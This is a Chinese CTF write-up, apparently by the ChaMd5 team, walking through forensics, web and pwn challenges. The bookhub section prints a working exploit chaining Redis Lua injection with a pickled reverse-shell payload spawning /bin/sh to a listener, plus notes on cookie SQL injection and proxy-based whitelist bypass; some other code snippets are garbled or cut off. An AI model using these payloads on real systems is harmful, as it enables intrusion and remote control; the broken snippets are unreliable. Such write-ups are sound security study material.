【  
本文来自 ChaMd5安全团队，文章内容以思路为主。  
如需转载，请先联系ChaMd5安全团队授权。  
未经授权请勿转载。  
】
**check-in**  
advertisement  
题目描述里写平台很安全，请不要攻击。  
所以尝试抓包，往Cookie的uid进行sqli  
**Forensics**  
ccls-fringe  
解压blob，执行以下脚本
    import os, sys1
    f = open('blob','rb+')
    con = f.read()
    for i in range(len(con)):
        if ord(con[i]) == 0:
            outstr = ''
            hexstr = ''
            for j in range(10):
                if i+j = 0x20 and ch  1 and outstr.find('int ') >= 0:
                        print hexstr + outstr
                    break
进行排序，发现变量定义有问题。  
找到所有int定义，发现还有个int b，组合起来得到flag  
flag:blesswodwhoisinhk
**web**  
dot free  
Django框架，输入任意地址可爆出所有路由。根据debug信息(XSSWebSite.urls)猜测为XSS题目  
过滤规则：空格，可以用/绕过  
尝试盲打XSS，未收到返回  
参数传入为数组url[]=xxx。触发django的debug，得到如下信息  
题目环境有点尴尬，死活收不到bot访问，一气之下开启了fuzz爆破，然后，然后就出来了。  
bookhub  
源码审计题目，flask框架，访问  
user.py Line 90看到有eval操作，猜测可以代码执行  
访问白名单中检查了X-Forwarded-For，改为127.0.0.1过不去  
具体白名单是 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.  
后端服务器使用了Nginx，猜测有一层反代干掉了X-Fowarded-For而导致无法伪造。  
52.52.4.252:8080 本质是一个http代理  
挂上这层代理访问 可以绕过  
但是发现当挂上代理之后，访问任何域名任何页面，都是book的页面  
新世界、   
题目思路应该是Redis + Lua注入，反序列化  
关键点 session + csrf token，构造反序列化代码，并防止csrftoken更新把反序列化代码删掉  
以下脚本说明一切
    # -*- coding:utf-8 -*-    
    import requests
    import re
    import json
    import random
    import string
    import cPickle
    import os
    import urllib
    req = requests.Session()
    DEBUG = 0
    URL = "http://18.213.16.123:5000/" if not DEBUG else "http://127.0.0.1:5000/"
    def rs(n=6):
        return ''.join(random.sample(string.ascii_letters + string.digits, n))
    class exp(object):
        def __reduce__(self):
            listen_ip = "127.0.0.1"
            listen_port = 1234
            s = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % (
                listen_ip, listen_port)
            return (os.system, (s,))
    x = [{'_fresh': False, '_permanent': True,
          'csrf_token': '2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8', 'exp': exp()}]
    s = cPickle.dumps(x)
    if __name__ == '__main__':
        payload = urllib.quote(s)
        yoursid = 'vvv'
        funcode = r"local function urlDecode(s) s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) return s end"
        # 插入payload并防止del
        sid = '%s\\" } %s ' % (rs(6), funcode) + \
            'redis.call(\\"set\\",\\"bookhub:session:%s\\",\\urlDecode("%s\\")) inputs = { \"bookhub:session:%s\" } --' % (
                yoursid, payload, yoursid)
        headers = {
            "Cookie": 'bookhub-session="x%s"' % sid,
            "Content-Type": "application/x-www-form-urlencoded",
            'X-CSRFToken': 'ImY3NGI2MDcxNmQ5NmYwYjExZTQ4N2ZlYTMxNDg0ZGQ3NjA0MGU2OWIi.Dj9f9w.WL0VY6e2y6edFTh6QcOKo9DnzLw',
        }
        res = req.get(URL + 'login/', headers=headers)
        if res.status_code == 200:
            html = res.content
            r = re.findall(r'csrf_token" type="hidden" value="(.*?)">', html)
            if r:
                headers['X-CSRFToken'] = r[0]
                # refresh_session
                data = {'submit': '1'}
                res = req.post(URL + 'admin/system/refresh_session/',
                               data=data, headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
                # fuck
                headers['Cookie'] = 'bookhub-session=vvv'
                res = req.get(URL + 'admin/', headers=headers)
                if res.status_code == 200:
                    print(res.content)
                else:
                    print(res.content)
**PWN**  
kid vim  
使用了KVM。在host的free函数存在可能出现的hangling pointer;update函数中可能出现数据双向copy:
    //free
    if ( r_cx  1 and sys.argv[1] == 'l': 
            io = process('./kid_vm')        
            context.log_level = 'debug'        
        else:   
            io = remote(HOST, PORT)              
        pwn()